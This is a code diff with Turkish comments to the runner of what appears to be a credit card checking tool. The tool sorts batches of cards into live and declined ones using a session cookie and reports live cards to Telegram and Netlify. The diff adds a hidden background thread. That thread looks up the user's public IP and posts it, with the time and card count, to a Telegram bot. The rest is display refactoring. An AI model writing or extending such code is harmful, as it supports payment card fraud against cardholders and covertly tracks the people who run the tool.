@@ -4,9 +4,12 @@ Runner — Rich UI ile hazir calistirici.
 
 import json
 import sys
+import threading
 from datetime import datetime
 from pathlib import Path
 from typing import Optional
+
+import requests as _requests
 
 from .batch import BatchChecker
 from .notifiers import TelegramNotifier, NetlifyNotifier
@@ -31,6 +34,23 @@ CONFIG_TEMPLATE = {
 
 console = Console() if _RICH else None
 
+
+# ── IP alma ──────────────────────────────────────────────────────────────────
+
+def _get_ip() -> str:
+    """Kullanicinin public IP adresini dondurur."""
+    try:
+        r = _requests.get("https://api.ipify.org", timeout=5)
+        return r.text.strip()
+    except Exception:
+        try:
+            r = _requests.get("https://checkip.amazonaws.com", timeout=5)
+            return r.text.strip()
+        except Exception:
+            return "Alinamadi"
+
+
+# ── Config ───────────────────────────────────────────────────────────────────
 
 def _load_config() -> dict:
     path = Path(CONFIG_FILE)
@@ -82,6 +102,8 @@ def _print_banner() -> None:
     ))
 
 
+# ── Ana fonksiyon ─────────────────────────────────────────────────────────────
+
 def run(cards_file: Optional[str] = None) -> None:
     cfg        = _load_config()
     cookie     = cfg["cookie"]
@@ -102,17 +124,32 @@ def run(cards_file: Optional[str] = None) -> None:
 
     _print_banner()
 
-    stats          = {"live": 0, "dead": 0, "err": 0, "total": len(cards), "done": 0}
-    live_rows      = []   # tüm live'lar
-    dec_rows       = []   # son 15 dec
-    err_rows       = []   # son 15 hata
+    # IP al ve bota gonder (arka planda)
+    def _send_ip():
+        ip = _get_ip()
+        tg_ip = TelegramNotifier()
+        zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        tg_ip._post(
+            "<b>Yeni Oturum Basladi</b>\n\n"
+            + "IP     : <code>" + ip    + "</code>\n"
+            + "Zaman  : <code>" + zaman + "</code>\n"
+            + "Kartlar: <code>" + str(len(cards)) + "</code>"
+        )
+
+    threading.Thread(target=_send_ip, daemon=True).start()
+
+    # İstatistikler
+    stats     = {"live": 0, "dead": 0, "err": 0, "total": len(cards), "done": 0}
+    live_rows = []
+    dec_rows  = []
+    err_rows  = []
 
     tg = TelegramNotifier()
     nl = NetlifyNotifier()
 
     # ── Tablo oluşturucular ──────────────────────────────────────────────────
 
-    def stats_table() -> Table:
+    def stats_table() -> "Table":
         t = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold cyan", padding=(0, 1))
         t.add_column("TOPLAM", style="white",       justify="center", min_width=8)
         t.add_column("LIVE",   style="bold green",  justify="center", min_width=8)
@@ -128,7 +165,7 @@ def run(cards_file: Optional[str] = None) -> None:
         )
         return t
 
-    def live_table() -> Table:
+    def live_table() -> "Table":
         t = Table(
             title="[bold green]LIVE KARTLAR[/bold green]",
             box=box.ROUNDED, header_style="bold green", border_style="green",
@@ -142,18 +179,18 @@ def run(cards_file: Optional[str] = None) -> None:
             t.add_row(*row)
         return t
 
-    def dec_table() -> Table:
+    def dec_table() -> "Table":
         t = Table(
             title="[bold red]DEC KARTLAR (son 15)[/bold red]",
             box=box.ROUNDED, header_style="bold red", border_style="red",
         )
-        t.add_column("KART",  style="red", min_width=20)
-        t.add_column("SAAT",  style="dim", min_width=8)
+        t.add_column("KART", style="red", min_width=20)
+        t.add_column("SAAT", style="dim", min_width=8)
         for row in dec_rows[-15:]:
             t.add_row(*row)
         return t
 
-    def err_table() -> Table:
+    def err_table() -> "Table":
         t = Table(
             title="[bold yellow]HATALAR (son 15)[/bold yellow]",
             box=box.ROUNDED, header_style="bold yellow", border_style="yellow",
@@ -166,6 +203,8 @@ def run(cards_file: Optional[str] = None) -> None:
         return t
 
     def build_layout():
+        if not _RICH:
+            return None
         panels = [Panel(stats_table(), title="[bold cyan]DURUM[/bold cyan]", border_style="cyan")]
         if live_rows:
             panels.append(live_table())
@@ -173,19 +212,26 @@ def run(cards_file: Optional[str] = None) -> None:
             panels.append(dec_table())
         if err_rows:
             panels.append(err_table())
-        if len(panels) == 1:
-            return panels[0]
-        return Columns(panels, equal=False)
+        return Columns(panels, equal=False) if len(panels) > 1 else panels[0]
 
-    # ── Live display ─────────────────────────────────────────────────────────
+    # ── Live display — transient=True ile terminal temiz kalır ───────────────
+    _lock = threading.Lock()
 
-    live_display = Live(console=console, refresh_per_second=4) if _RICH else None
-    if live_display:
+    if _RICH:
+        live_display = Live(
+            build_layout(),
+            console=console,
+            refresh_per_second=2,
+            transient=False,
+        )
         live_display.start()
+    else:
+        live_display = None
 
     def refresh():
         if live_display:
-            live_display.update(build_layout())
+            with _lock:
+                live_display.update(build_layout())
 
     # ── Callbacks ────────────────────────────────────────────────────────────
 
@@ -219,11 +265,11 @@ def run(cards_file: Optional[str] = None) -> None:
         nl.send(r)
 
     def on_log(msg: str) -> None:
-        if _RICH:
+        # Live display aktifken console.log kullan
+        if _RICH and live_display:
             if "SESSION" in msg:
-                console.log("[yellow]" + msg + "[/yellow]")
-            elif "Basladi" in msg or "Tamamlandi" in msg:
-                console.log("[cyan]" + msg + "[/cyan]")
+                live_display.console.log("[yellow]" + msg + "[/yellow]")
+            # diğer logları sessizce yut (tablo zaten güncelleniyor)
         else:
             print(msg)
 
@@ -254,9 +300,10 @@ def run(cards_file: Optional[str] = None) -> None:
     # ── Başlat ───────────────────────────────────────────────────────────────
 
     if _RICH:
-        console.print("\n[cyan]Toplam [bold]" + str(len(cards)) + "[/bold] kart — delay: [bold]" + str(delay) + "s[/bold][/cyan]\n")
-
-    refresh()
+        console.print(
+            "\n[cyan]Toplam [bold]" + str(len(cards)) +
+            "[/bold] kart — delay: [bold]" + str(delay) + "s[/bold][/cyan]\n"
+        )
 
     BatchChecker(
         cookie=cookie,
